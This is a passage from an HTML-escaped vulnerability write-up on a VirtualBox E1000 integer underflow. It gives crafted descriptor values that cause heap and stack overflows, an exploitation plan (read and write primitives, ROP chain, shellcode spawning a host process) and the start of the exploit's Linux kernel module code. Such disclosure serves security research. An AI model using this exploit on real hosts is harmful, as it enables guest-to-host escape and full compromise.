            &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt; == &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt; || pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt; == &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;)
            {
                &lt;span class=&quot;pl-c1&quot;&gt;E1kLog2&lt;/span&gt;((&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;% E&lt;/span&gt;mpty data descriptor, skipped.&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;szPrf&lt;/span&gt;));
            }
            &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
            {
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;e1kXmitIsGsoBuf&lt;/span&gt;(pThis-&amp;gt;&lt;span class=&quot;pl-c1&quot;&gt;CTX_SUFF&lt;/span&gt;(pTxSg)))
                {
                    ...
                }
                &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (!pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fTSE&lt;/span&gt;)
                {
                    ...
                }
                &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
                {
                    &lt;span class=&quot;pl-c1&quot;&gt;STAM_COUNTER_INC&lt;/span&gt;(&amp;amp;pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;StatTxPathFallback&lt;/span&gt;);
                    rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kFallbackAddToFrame&lt;/span&gt;(pThis, pDesc, fOnWorkerThread);
                }
            }
            ...
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first descriptor passed to e1kXmitDesc is context_1. The function does nothing with context descriptors.&lt;/p&gt;
&lt;p&gt;The second descriptor passed to e1kXmitDesc is data_2. Since all of our data descriptors have tcp_segmentation_enable == true (pDesc-&amp;gt;data.cmd.fTSE above) we call e1kFallbackAddToFrame where there will be an integer underflow while data_5 is processed.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kFallbackAddToFrame&lt;/span&gt;(PE1KSTATE pThis, E1KTXDESC *pDesc, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
    ...
    &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; u16MaxPktLen = pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u8HDRLEN&lt;/span&gt; + pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u16MSS&lt;/span&gt;;

    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;     * Carve out segments.&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;     &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; rc = VINF_SUCCESS;
    &lt;span class=&quot;pl-k&quot;&gt;do&lt;/span&gt;
    {
        &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt; Calculate how many bytes we have left in this TCP segment &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cb = u16MaxPktLen - pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u16TxPktLen&lt;/span&gt;;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (cb &amp;gt; pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt;)
        {
            &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt; This descriptor fits completely into current segment &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
            cb = pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt;;
            rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kFallbackAddSegment&lt;/span&gt;(pThis, pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt;, cb, pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fEOP&lt;/span&gt; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;fSend&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;, fOnWorkerThread);
        }
        &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
        {
            ...
        }

        pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt;    += cb;
        pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt; -= cb;
    } &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt; &amp;gt; &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;pl-c1&quot;&gt;RT_SUCCESS&lt;/span&gt;(rc));

    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fEOP&lt;/span&gt;)
    {
        ...
        pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u16TxPktLen&lt;/span&gt; = &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;;
        ...
    }

    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; VINF_SUCCESS; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt;/ @todo consider rc;&lt;/span&gt;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The most important variables here are u16MaxPktLen, pThis-&amp;gt;u16TxPktLen, and pDesc-&amp;gt;data.cmd.u20DTALEN.&lt;/p&gt;
&lt;p&gt;Let's draw a table where values of these variables are specified before and after execution of e1kFallbackAddToFrame function for the two data descriptors.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tx Descriptor&lt;/th&gt;
&lt;th&gt;Before/After&lt;/th&gt;
&lt;th&gt;u16MaxPktLen&lt;/th&gt;
&lt;th&gt;pThis-&amp;gt;u16TxPktLen&lt;/th&gt;
&lt;th&gt;pDesc-&amp;gt;data.cmd.u20DTALEN&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;data_2&lt;/td&gt;
&lt;td&gt;Before&lt;/td&gt;
&lt;td&gt;0x3010&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;After&lt;/td&gt;
&lt;td&gt;0x3010&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;data_3&lt;/td&gt;
&lt;td&gt;Before&lt;/td&gt;
&lt;td&gt;0x3010&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;After&lt;/td&gt;
&lt;td&gt;0x3010&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;You just need to note that when data_3 is processed pThis-&amp;gt;u16TxPktLen equals to 0x10.&lt;/p&gt;
&lt;p&gt;Next is the most important part. Please look again at the end of the snippet of e1kXmitPacket:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT &amp;amp;&amp;amp; pDesc-&amp;gt;legacy.cmd.fEOP)
            &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since data_3 type != E1K_DTYP_CONTEXT and data_3.end_of_packet == true, we break from the loop despite the fact that there are context_4 and data_5 to be processed. Why is it important? The key to understand the vulnerability is to understand that all context descriptors are processed before data descriptors. Context descriptors are processed during the TCP Segmentation Context Update in e1kLocateTxPacket. Data descriptors are processed later in the loop inside e1kXmitPacket function. The developer intention was to forbid changing u16MaxPktLen after some data was processed to prevent integer underflows in the code:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cb = u16MaxPktLen - pThis-&amp;gt;u16TxPktLen;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But we are able to bypass this protection: recall that in e1kLocateTxPacket we forced the function to return because of data_3.end_of_packet == true. And because of that we have two descriptors (context_4 and data_5) left to be processed despite the fact that pThis-&amp;gt;u16TxPktLen is 0x10, not 0. So there is a possibility to change u16MaxPktLen using context_4.maximum_segment_size to make the integer underflow.&lt;/p&gt;
&lt;h4&gt;[context_4, data_5] Processing&lt;/h4&gt;
&lt;p&gt;Now when the first three descriptors were processed we again arrive to the inner loop of e1kXmitPending:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
            &lt;span class=&quot;pl-k&quot;&gt;while&lt;/span&gt; (e1kLocateTxPacket(pThis))
            {
                fIncomplete = &lt;span class=&quot;pl-c1&quot;&gt;false&lt;/span&gt;;
                rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitAllocBuf&lt;/span&gt;(pThis, pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;fGSO&lt;/span&gt;);
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_FAILURE&lt;/span&gt;(rc))
                    &lt;span class=&quot;pl-k&quot;&gt;goto&lt;/span&gt; out;
                rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitPacket&lt;/span&gt;(pThis, fOnWorkerThread);
                &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_FAILURE&lt;/span&gt;(rc))
                    &lt;span class=&quot;pl-k&quot;&gt;goto&lt;/span&gt; out;
            }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here we call e1kLocateTxPacket do the initial processing of context_4 and data_5 descriptors. It has been said that we can set context_4.maximum_segment_size to a size lesser than the size of data already read i.e. lesser than 0x10. Recall our input Tx descriptors:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;context_4.header_length = 0
context_4.maximum_segment_size = 0xF
context_4.tcp_segmentation_enabled = true

data_5.data_length = 0x4188
data_5.end_of_packet = true
data_5.tcp_segmentation_enabled = true
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;As a result of the call to e1kLocateTxPacket we have the maximum segment size equals to 0xF, whereas the size of data already read is 0x10.&lt;/p&gt;
&lt;p&gt;Finally, when processing data_5 we again arrive to e1kFallbackAddToFrame and have the following variable values:&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tx Descriptor&lt;/th&gt;
&lt;th&gt;Before/After&lt;/th&gt;
&lt;th&gt;u16MaxPktLen&lt;/th&gt;
&lt;th&gt;pThis-&amp;gt;u16TxPktLen&lt;/th&gt;
&lt;th&gt;pDesc-&amp;gt;data.cmd.u20DTALEN&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;data_5&lt;/td&gt;
&lt;td&gt;Before&lt;/td&gt;
&lt;td&gt;0xF&lt;/td&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;0x4188&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;After&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;And therefore we have an integer underflow:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cb = u16MaxPktLen - pThis-&amp;gt;u16TxPktLen;
=&amp;gt;
&lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cb = &lt;span class=&quot;pl-c1&quot;&gt;0xF&lt;/span&gt; - &lt;span class=&quot;pl-c1&quot;&gt;0x10&lt;/span&gt; = &lt;span class=&quot;pl-c1&quot;&gt;0xFFFFFFFF&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This makes the following check to be true since 0xFFFFFFFF &amp;gt; 0x4188:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (cb &amp;gt; pDesc-&amp;gt;data.cmd.u20DTALEN)
        {
            cb = pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u20DTALEN&lt;/span&gt;;
            rc = &lt;span class=&quot;pl-c1&quot;&gt;e1kFallbackAddSegment&lt;/span&gt;(pThis, pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u64BufAddr&lt;/span&gt;, cb, pDesc-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;cmd&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fEOP&lt;/span&gt; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;fSend&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;, fOnWorkerThread);
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;e1kFallbackAddSegment function will be called with size 0x4188. Without the vulnerability it's impossible to call e1kFallbackAddSegment with a size greater than 0x4000 because, during the TCP Segmentation Context Update in e1kUpdateTxContext, there is a check that the maximum segment size is less or equal to 0x4000:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;DECLINLINE&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;) e1kUpdateTxContext(PE1KSTATE pThis, E1KTXDESC *pDesc)
{
...
        &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; cbMaxSegmentSize = pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u16MSS&lt;/span&gt; + pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u8HDRLEN&lt;/span&gt; + &lt;span class=&quot;pl-c1&quot;&gt;4&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;VTAG&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;RT_UNLIKELY&lt;/span&gt;(cbMaxSegmentSize &amp;gt; E1K_MAX_TX_PKT_SIZE))
        {
            pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u16MSS&lt;/span&gt; = E1K_MAX_TX_PKT_SIZE - pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;contextTSE&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dw3&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;u8HDRLEN&lt;/span&gt; - &lt;span class=&quot;pl-c1&quot;&gt;4&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;VTAG&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
            ...
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Buffer Overflow&lt;/h3&gt;
&lt;p&gt;We have called e1kFallbackAddSegment with size 0x4188. How this can be abused? There are at least two possibilities I found. Firstly, data will be read from the guest into a heap buffer:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kFallbackAddSegment&lt;/span&gt;(PE1KSTATE pThis, RTGCPHYS PhysAddr, &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; u16Len, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fSend, &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; fOnWorkerThread)
{
    ...
    &lt;span class=&quot;pl-c1&quot;&gt;PDMDevHlpPhysRead&lt;/span&gt;(pThis-&amp;gt;&lt;span class=&quot;pl-c1&quot;&gt;CTX_SUFF&lt;/span&gt;(pDevIns), PhysAddr,
                      pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;aTxPacketFallback&lt;/span&gt; + pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u16TxPktLen&lt;/span&gt;, u16Len);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here pThis-&amp;gt;aTxPacketFallback is the buffer of size 0x3FA0 and u16Len is 0x4188 — an obvious overflow that can lead, for example, to a function pointers overwrite.&lt;/p&gt;
&lt;p&gt;Secondly, if we dig deeper we found that e1kFallbackAddSegment calls e1kTransmitFrame that can, with a certain configuration of E1000 registers, call e1kHandleRxPacket function. This function allocates a stack buffer of size 0x4000 and then copies data of a specified length (0x4188 in our case) to the buffer without any check:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1kHandleRxPacket&lt;/span&gt;(PE1KSTATE pThis, &lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; *pvBuf, &lt;span class=&quot;pl-c1&quot;&gt;size_t&lt;/span&gt; cb, E1KRXDST status)
{
#&lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; defined(IN_RING3)
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt;   rxPacket[E1K_MAX_RX_PKT_SIZE];
    ...
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (status.&lt;span class=&quot;pl-smi&quot;&gt;fVP&lt;/span&gt;)
    {
        ...
    }
    &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;pl-c1&quot;&gt;memcpy&lt;/span&gt;(rxPacket, pvBuf, cb);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As you see, we turned an integer underflow to a classical stack buffer overflow. The two overflows above — heap and stack ones — are used in the exploit.&lt;/p&gt;
&lt;h2&gt;Exploit&lt;/h2&gt;
&lt;p&gt;The exploit is Linux kernel module (LKM) to load in a guest OS. The Windows case would require a driver differing from the LKM just by an initialization wrapper and kernel API calls.&lt;/p&gt;
&lt;p&gt;Elevated privileges are required to load a driver in both OSs. It's common and isn't considered an insurmountable obstacle. Look at Pwn2Own contest where researcher use exploit chains: a browser opened a malicious website in the guest OS is exploited, a browser sandbox escape is made to gain full ring 3 access, an operating system vulnerability is exploited to pave a way to ring 0 from where there are anything you need to attack a hypervisor from the guest OS. The most powerful hypervisor vulnerabilities are for sure those that can be exploited from guest ring 3. There in VirtualBox is also such code that is reachable without guest root privileges, and it's mostly not audited yet.&lt;/p&gt;
&lt;p&gt;The exploit is 100% reliable. It means it either works always or never because of mismatched binaries or other, more subtle reasons I didn't account. It works at least on Ubuntu 16.04 and 18.04 x86_64 guests with default configuration.&lt;/p&gt;
&lt;h3&gt;Exploitation Algorithm&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;An attacker unloads e1000.ko loaded by default in Linux guests and loads the exploit's LKM.&lt;/li&gt;
&lt;li&gt;The LKM initializes E1000 according to the datasheet. Only the transmit half is initialized since there is no need for the receive half.&lt;/li&gt;
&lt;li&gt;Step 1: information leak.
&lt;ol&gt;&lt;li&gt;The LKM disables E1000 loopback mode to make stack buffer overflow code unreachable.&lt;/li&gt;
&lt;li&gt;The LKM uses the integer underflow vulnerability to make the heap buffer overflow.&lt;/li&gt;
&lt;li&gt;The heap buffer overflow allows for use E1000 EEPROM to write two any bytes relative to a heap buffer in 128 KB range. Hence the attacker gains a write primitive.&lt;/li&gt;
&lt;li&gt;The LKM uses the write primitive 8 times to write bytes to ACPI (Advanced Configuration and Power Interface) data structure on heap. Bytes are written to an index variable of a heap buffer from which a single byte will be read. Since the buffer size is lesser than maximum index number (255) the attacker can read past the buffer, hence he/she gains a read primitive.&lt;/li&gt;
&lt;li&gt;The LKM uses the read primitive 8 times to access ACPI and obtain 8 bytes from the heap. Those bytes are pointer of VBoxDD.so shared library.&lt;/li&gt;
&lt;li&gt;The LKM subtracts RVA from the pointer to obtain VBoxDD.so image base.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;Step 2: stack buffer overflow.
&lt;ol&gt;&lt;li&gt;The LKM enabled E1000 loopback mode to make stack buffer overflow code reachable.&lt;/li&gt;
&lt;li&gt;The LKM uses the integer underflow vulnerability to make the heap buffer overflow and the stack buffer overflow. Saved return address (RIP/EIP) is overwritten. The attacker gains control.&lt;/li&gt;
&lt;li&gt;ROP chain is executed to execute a shellcode loader.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;Step 3: shellcode.
&lt;ol&gt;&lt;li&gt;The shellcode loader copies a shellcode from the stack next to itself. The shellcode is executed.&lt;/li&gt;
&lt;li&gt;The shellcode does fork and execve syscalls to spawn an arbitrary process on the host side.&lt;/li&gt;
&lt;li&gt;The parent process does process continuation.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;The attacker unloads the LKM and loads e1000.ko back to allow the guest to use network.&lt;/li&gt;
&lt;/ol&gt;&lt;h3&gt;Initialization&lt;/h3&gt;
&lt;p&gt;The LKM maps physical memory regarding to E1000 MMIO. Physical address and size are predefined by the hypervisor.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* &lt;span class=&quot;pl-en&quot;&gt;map_mmio&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;) {
    &lt;span class=&quot;pl-c1&quot;&gt;off_t&lt;/span&gt; pa = &lt;span class=&quot;pl-c1&quot;&gt;0xF0000000&lt;/span&gt;;
    &lt;span class=&quot;pl-c1&quot;&gt;size_t&lt;/span&gt; len = &lt;span class=&quot;pl-c1&quot;&gt;0x20000&lt;/span&gt;;

    &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* va = &lt;span class=&quot;pl-c1&quot;&gt;ioremap&lt;/span&gt;(pa, len);
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (!va) {
        &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;ioremap failed to map MMIO&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);
        &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;NULL&lt;/span&gt;;
    }

    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; va;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then E1000 general purpose registers are configured, Tx Ring memory is allocated, transmit registers are configured.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;e1000_init&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* mmio) {
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Configure general purpose registers&lt;/span&gt;

    &lt;span class=&quot;pl-c1&quot;&gt;configure_CTRL&lt;/span&gt;(mmio);

    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Configure TX registers&lt;/span&gt;

    g_tx_ring = &lt;span class=&quot;pl-c1&quot;&gt;kmalloc&lt;/span&gt;(MAX_TX_RING_SIZE, GFP_KERNEL);
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (!g_tx_ring) {
        &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Failed to allocate TX Ring&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);
        &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt;;
    }

    &lt;span class=&quot;pl-c1&quot;&gt;configure_TDBAL&lt;/span&gt;(mmio);
    &lt;span class=&quot;pl-c1&quot;&gt;configure_TDBAH&lt;/span&gt;(mmio);
